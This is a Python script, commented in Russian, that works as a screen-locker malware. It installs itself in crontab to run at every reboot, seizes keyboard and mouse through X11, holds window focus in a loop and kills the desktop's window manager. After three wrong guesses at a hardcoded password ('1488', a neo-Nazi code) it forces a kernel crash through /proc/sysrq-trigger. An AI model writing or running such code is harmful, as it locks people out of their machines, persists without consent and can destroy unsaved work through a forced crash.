#!/usr/bin/env python3
import os, sys, time, threading, subprocess, shlex
import pygame
from pygame.locals import *

# ---------- автозагрузка ----------
def add_to_crontab():
    script_path = os.path.abspath(__file__)
    cmd = f"@reboot /usr/bin/python3 {shlex.quote(script_path)} &"
    try:
        existing = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()
    except:
        existing = ""
    if cmd not in existing:
        with open("/tmp/crontab_new", "w") as f:
            f.write(existing.strip() + "\n" + cmd + "\n")
        subprocess.call(["crontab", "/tmp/crontab_new"])
        os.unlink("/tmp/crontab_new")

# ---------- жесткий захват ввода через X11 ----------
def hard_grab():
    try:
        import Xlib.display
        d = Xlib.display.Display()
        root = d.screen().root
        # Захват клавиатуры и мыши с Async – всё равно все события идут к нам
        root.grab_keyboard(True, Xlib.X.GrabModeAsync, Xlib.X.GrabModeAsync,
                           Xlib.X.CurrentTime)
        root.grab_pointer(True, Xlib.X.ButtonPressMask | Xlib.X.ButtonReleaseMask | Xlib.X.PointerMotionMask,
                          Xlib.X.GrabModeAsync, Xlib.X.GrabModeAsync, Xlib.X.NONE, Xlib.X.NONE, Xlib.X.CurrentTime)
        d.sync()
        # Также можно запретить передачу событий другим окнам
        Xlib.X.AllowEvents(d, Xlib.X.AsyncKeyboard, Xlib.X.CurrentTime)
        Xlib.X.AllowEvents(d, Xlib.X.AsyncPointer, Xlib.X.CurrentTime)
    except Exception as e:
        print("Ошибка захвата:", e)

# ---------- принудительное удержание фокуса ----------
def force_focus():
    try:
        import Xlib.display
        d = Xlib.display.Display()
        root = d.screen().root
        # Ищем наше окно по имени
        win_id = None
        for win in root.query_tree().children:
            name = win.get_wm_name()
            if name == "LOCKED":
                win_id = win
                break
        if win_id:
            while True:
                win_id.set_input_focus(Xlib.X.RevertToParent, Xlib.X.CurrentTime)
                d.sync()
                time.sleep(0.1)
    except:
        pass

# ---------- убить оконный менеджер (чтобы не было панели) ----------
def kill_wm():
    # раскомментируй, если хочешь полностью убить DE – опасно, но эффективно
     subprocess.call(["pkill", "-f", "gnome-shell"])
     subprocess.call(["pkill", "-f", "kwin"])
     subprocess.call(["pkill", "-f", "xfwm4"])
    pass

# ---------- звук ----------
def play_sound():
    subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
    subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)

# ---------- kernel panic ----------
def panic():
    with open("/proc/sysrq-trigger", "w") as f:
        f.write("c")

# ---------- настройки ----------
PASSWORD = "1488"
MAX_ATTEMPTS = 3
attempts_left = MAX_ATTEMPTS
input_buffer = ""

# ---------- pygame ----------
pygame.init()
info = pygame.display.Info()
screen = pygame.display.set_mode((info.current_w, info.current_h),
                                 pygame.FULLSCREEN | pygame.NOFRAME)
pygame.display.set_caption("LOCKED")
pygame.mouse.set_visible(False)

# Захват ввода (глобальный)
hard_grab()

# Запуск потока для удержания фокуса
threading.Thread(target=force_focus, daemon=True).start()

# Убить WM (если нужно)
kill_wm()

# шрифты
font = pygame.font.SysFont("monospace", 28, bold=True)
font_small = pygame.font.SysFont("monospace", 22)
BLACK = (0,0,0); GREEN = (0,255,0); RED = (255,0,0); WHITE = (255,255,255)

def draw():
    screen.fill(BLACK)
    txt = font.render("YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD", True, GREEN)
    screen.blit(txt, (screen.get_width()//2 - txt.get_width()//2, 50))
    txt2 = font_small.render(f"ATTEMPTS LEFT: {attempts_left}", True, GREEN)
    screen.blit(txt2, (screen.get_width()//2 - txt2.get_width()//2, 100))
    stars = "*" * len(input_buffer)
    inp = font.render(f"> {stars}", True, GREEN)
    screen.blit(inp, (screen.get_width()//2 - inp.get_width()//2, 150))
    keys = ["1 2 3", "4 5 6", "7 8 9", "   0"]
    for i, row in enumerate(keys):
        txt_key = font_small.render(row, True, GREEN)
        screen.blit(txt_key, (screen.get_width()//2 - txt_key.get_width()//2, 210 + i*40))
    pygame.display.flip()

# ---------- добавление в автозагрузку ----------
add_to_crontab()

# ---------- главный цикл ----------
running = True
draw()
while running:
    for event in pygame.event.get():
        if event.type == KEYDOWN:
            if event.key == K_RETURN:
                if input_buffer == PASSWORD:
                    running = False
                    pygame.quit()
                    sys.exit(0)
                else:
                    input_buffer = ""
                    attempts_left -= 1
                    if attempts_left <= 0:
                        draw()
                        threading.Thread(target=play_sound, daemon=True).start()
                        for i in range(10):
                            color = RED if i%2==0 else WHITE
                            screen.fill(color); pygame.display.flip(); time.sleep(0.1)
                        screen.fill(BLACK); pygame.display.flip()
                        threading.Timer(5.0, panic).start()
                        running = False
                    else:
                        draw()
            elif event.key == K_BACKSPACE:
                input_buffer = input_buffer[:-1]; draw()
            elif event.key in (K_0,K_1,K_2,K_3,K_4,K_5,K_6,K_7,K_8,K_9):
                if len(input_buffer) < 4:
                    input_buffer += chr(event.key); draw()
        if event.type == QUIT:
            pass

# бесконечный цикл после провала
while True:
    time.sleep(1)
